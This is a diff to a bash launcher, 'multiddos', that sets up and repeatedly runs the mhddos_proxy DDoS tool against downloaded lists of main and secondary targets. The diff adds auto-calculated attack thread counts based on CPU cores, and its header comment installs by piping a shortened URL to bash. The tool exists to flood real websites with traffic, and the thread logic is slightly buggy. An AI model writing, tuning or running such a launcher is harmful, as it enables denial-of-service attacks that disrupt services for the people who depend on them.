@@ -1,24 +1,17 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
-sudo apt-get update -qq -y
-sudo apt-get install -qq -y xdotool toilet
+echo "Loading..."
+
+sudo apt-get update -qq -y >/dev/null 2>&1 && sudo apt-get install -qq -y toilet
+# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
+sudo apt-get install -qq -y tmux python3 python3-pip
+pip install --upgrade pip >/dev/null 2>&1
 
 cd ~
 rm -rf multidd
 mkdir multidd
 cd multidd
-
-gotop="on"
-db1000n="off"
-uashield="off"
-vnstat="off"
-matrix="off"
-methods="--http-methods GET STRESS"
-#rpc="--rpc 2000"
-#export debug="--debug"
-#threads="-t 250"
-#if [[ $(nproc --all) ]]
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green powaaa
@@ -28,6 +21,27 @@ typing_on_screen (){
     done
     tput sgr0 2 &>/dev/null
 }
+export -f typing_on_screen
+
+gotop="on"
+db1000n="off"
+uashield="off"
+vnstat="off"
+matrix="off"
+methods="--http-methods GET STRESS"
+threads="" #later will check if value still NONE then -t was not passed in command line and auto value will be calculated
+#rpc="--rpc 2000"
+#export debug="--debug"
+
+typing_on_screen (){
+    tput setaf 2 &>/dev/null # green powaaa
+    for ((i=0; i<=${#1}; i++)); do
+        printf '%s' "${1:$i:1}"
+        sleep 0.$(( (RANDOM % 5) + 1 ))
+    done
+    tput sgr0 2 &>/dev/null
+}
+export -f typing_on_screen
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
@@ -79,25 +93,17 @@ toilet -t --metal " MULTIDDOS"
 
 typing_on_screen 'Шукаю завдання...'
 
-# xdotool type --delay 100 "Шукаю завдання..."
-# sleep 1
-# xdotool type --delay 100 " знайшов!"
-echo -e "\n"
 sleep 1
+echo -e "\n"
 echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m"
 echo -e "Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m"
 echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m"
+
+echo -e "\nКількість потоків:" $threads
 echo -e "\nЗавантаження..."
 sleep 5
 }
 export -f prepare_targets_and_banner
-
-prepare_targets_and_banner
-
-clear
-# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
-sudo apt-get install -q -y tmux  python3 python3-pip
-pip install --upgrade pip
 
 launch () {
 if [ ! -f "/usr/local/bin/gotop" ]; then
@@ -179,6 +185,22 @@ while [ "$1" != "" ]; do
     esac
 done
 
+#assign auto calculated threads value if it wasn't assidgned as -t in command line
+#threads = number of cores * 250
+if [[ $threads == "" ]]; then 
+    if [[ $(nproc --all) -le 8 ]]; then
+        threads=$(expr $(nproc --all) "*" 50)
+    elif [[ $(nproc --all) -gt 8 ]]; then
+        threads="-t 2000"
+    else
+        threads="-t 500" #safe value in case something go wrong
+    fi
+export $threads
+fi
+
+prepare_targets_and_banner
+clear
+
 # create small separate script to re-launch only this part of code and not the whole thing
 cat > auto_bash.sh << 'EOF'
 # create swap file if system doesn't have it
@@ -201,6 +223,7 @@ while true; do
         python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $rpc $methods&
 sleep 30
 prepare_targets_and_banner
+clear
 done
 EOF
 
